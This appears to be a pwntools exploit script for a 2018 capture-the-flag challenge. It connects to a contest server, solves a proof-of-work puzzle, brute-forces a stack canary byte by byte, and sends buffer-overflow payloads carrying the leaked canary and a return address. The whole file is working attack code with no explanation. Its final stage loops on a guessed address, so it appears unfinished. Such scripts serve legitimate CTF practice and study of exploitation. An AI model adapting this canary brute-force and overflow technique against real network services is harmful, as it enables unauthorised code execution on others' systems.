#!/usr/bin/env python
# coding=utf-8
from pwn import *
import os

context.arch ='amd64'
#context.log_level ='debug'

#io=process('./baby')
io=remote('e4771e24.quals2018.oooverflow.io',31337)


def pow_hash(challenge, solution):
     return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
     h = pow_hash(challenge, solution)
     return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
     candidate = 0
     while True:
         if check_pow(challenge, n, candidate):
             return candidate
         candidate += 1


def myinit():
    io.recvuntil('Challenge: ')
    xx = io.recvuntil('\n',drop=True)
    print xx
    io.recvuntil('n: ')
    n = io.recvuntil('\n',drop=True)
    print n
    #xx = '1Xiyc440Xu'
    #n = 22
    solution = solve_pow(xx,int(n))
    print solution
    io.recvline()
    io.sendline(str(solution))
    
sys.setrecursionlimit(1000000)
canary = ''
xxx=0

def crack():
    try:
        io.recvuntil('Go\n',timeout=2)
    except:
        crack()
    global xxx
    global canary
    payload = '\x00'*8+canary+chr(xxx)
    print payload
    io.send('\x00')
    sleep(0.1)
    #io.recv()

    io.send('\x00'*8)
    sleep(0.1)
    io.send(payload)
    sleep(0.1)
    try:
        ans = io.recv(timeout=2)
    except:
        crack()
    if 'stack smashing' in ans:
        print 'erro:'+ str(xxx)
        xxx=xxx+1
        crack()
    else:
        canary += chr(xxx)
        print 'hit!'
        if len(canary)==8:
            return
        else:
            xxx=0
            crack()


def repeate():
    try:
        io.recvuntil('Go\n',timeout=2)
    except:
        repeate()
    
    io.send('\x00'*8)
    sleep(0.1)
    io.send('\x00'*8)
    sleep(0.1)
    payload = p64(0)+canary+p64(0)+p64(0x400000)
    io.send(payload)
    sleep(0.1)

    try:
        ans = io.recv(timeout=2)
    except:
        repeate()
    print ans
    pause()
    repeate()
 
if __name__ == '__main__':
    pause()
    myinit()
    pause()
    crack()
    print canary
    pause()
    repeate()
    pause()
    
